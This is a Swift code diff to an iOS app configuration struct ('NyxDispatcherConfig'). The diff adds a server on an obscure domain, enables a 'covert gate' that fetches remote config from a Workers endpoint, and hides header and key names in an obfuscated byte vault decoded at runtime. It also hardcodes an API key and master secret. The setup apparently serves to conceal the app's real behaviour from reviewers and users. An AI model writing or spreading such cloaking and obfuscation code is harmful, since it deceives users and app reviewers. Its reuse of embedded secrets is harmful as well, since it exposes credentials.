@@ -18,16 +18,8 @@ struct NyxDispatcherConfig {
     
     
     
-    static let schemaVersion = "1"
-    
-    
-    
-    
-    
+    static let schemaVersion = "2"
     static let networkingEnabled = true
-    
-    
-    
     static let webSurfaceEnabled = false
 
     
@@ -58,7 +50,7 @@ struct NyxDispatcherConfig {
     
     
     
-    static let serverURLPlain = ""
+    static let serverURLPlain = "https://concrete-league-rain-beat-time-home.online"
     static let initPathPlain = ""
     static let alternateInitPathPlain = ""
     static let eventPathPlain = ""
@@ -120,18 +112,14 @@ struct NyxDispatcherConfig {
     
     
     
-    static let rtVaultKey: [UInt8] = []
-    static let rtVault: [[UInt8]] = []
-
-    
-    
-    static let hdrSchemaPlain = "X-Schema"
-    static let hdrSignaturePlain = "X-Signature"
-    static let hdrTimestampPlain = "X-Timestamp"
-    static let hdrFlowTokenPlain = "X-Flow-Token"
-    static let flowTokenKeyPlain = "widget.flow.token"
-    static let restrictionKeyPlain = "widget.cached.restriction"
-
+    static let rtVaultKey: [UInt8] = [131, 153, 15, 31, 253, 176, 172, 102, 78, 117, 94, 77, 67, 71, 161, 104, 66, 166, 220, 235, 189, 220, 23, 13, 225, 228, 141, 134, 37, 116, 194, 119]
+    static let rtVault: [[UInt8]] = [[219, 180, 92, 124, 149, 213, 193, 7], [219, 180, 92, 118, 154, 222, 205, 18, 59, 7, 59], [219, 180, 91, 118, 144, 213, 223, 18, 47, 24, 46], [219, 180, 73, 115, 146, 199, 129, 50, 33, 30, 59, 35], [244, 240, 107, 120, 152, 196, 130, 0, 34, 26, 41, 99, 55, 40, 202, 13, 44], [244, 240, 107, 120, 152, 196, 130, 5, 47, 22, 54, 40, 39, 105, 211, 13, 49, 210, 174, 130, 222, 168, 126, 98, 143]]
+    static let hdrSchemaPlain = ""
+    static let hdrSignaturePlain = ""
+    static let hdrTimestampPlain = ""
+    static let hdrFlowTokenPlain = ""
+    static let flowTokenKeyPlain = ""
+    static let restrictionKeyPlain = ""
     fileprivate static func rtReveal(_ idx: Int, _ fallback: String) -> String {
         guard idx >= 0, idx < rtVault.count,
               let s = NyxNova.reveal(rtVault[idx], key: rtVaultKey) else {
@@ -154,43 +142,12 @@ struct NyxDispatcherConfig {
     
     
     static let cherryFlowEnabled = true
-    
-    
-    
-    
-    
     static let alternateInitPathEnabled = true
-    
-    
-    
-    
-    
-    
-    
     static let encryptBodyEnabled = true
-    
-    
-    
-    
-    
-    static let authInBodyEnabled = false
-    
-
-    
-    
-    
-    
-    
-    
-    
+    static let authInBodyEnabled = true
     static let privacyInSettingsEnabled = false
-    
-    
-    
-    
-    
-    static let privacyURLString = "https://telegra.ph/Kings-Court--Support--Privacy-08-05"
-    static let termsURLString = "https://telegra.ph/Kings-Court--Support--Privacy-08-05"
+    static let privacyURLString = "https://concrete-league-rain-beat-time-home.online/privacy"
+    static let termsURLString = "https://concrete-league-rain-beat-time-home.online/terms"
 
     
     static var privacyURL: URL? {
@@ -212,32 +169,9 @@ struct NyxDispatcherConfig {
     
     
     static let nativeAdEnabled = true
-    
-
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     static let covertGateEnabled = true
-    
-    
-    
-    
-    
     static let covertGateURLPlain = "https://covert-gate.wc-appcfg.workers.dev/v1/config"
-    
-    
-    
     static let covertGateID = "P-GdCUzg9i_EClu0"
-    
     static var covertGateURL: String { covertGateURLPlain }
 
     
@@ -289,39 +223,11 @@ struct NyxDispatcherConfig {
     
     
     static let apiKey = "4d33e5ee235720d272b33b06b9ec86ecdbe8f2c87e5c29427b881274e593279f"
-    
-    
-    
     static let masterSecret = "d7c0f5740b7d0da134eb013b828323a0f35867a48d0b0f35ac47d6adf7488d4c"
-    
-    
-    
-    
     static let hmacEnabled = true
-    
-    
-    
-    
-    
-    static let perAppPathsEnabled = false
-    
-
-    
-    
-    
-    
-    
+    static let perAppPathsEnabled = true
     static let deepLinkScheme = ""
-    
-    
-    
-    
-    
-    
     static let universalDomains: [String] = []
-    
-
-    
     static let privacyDelay: TimeInterval = 2
 
     
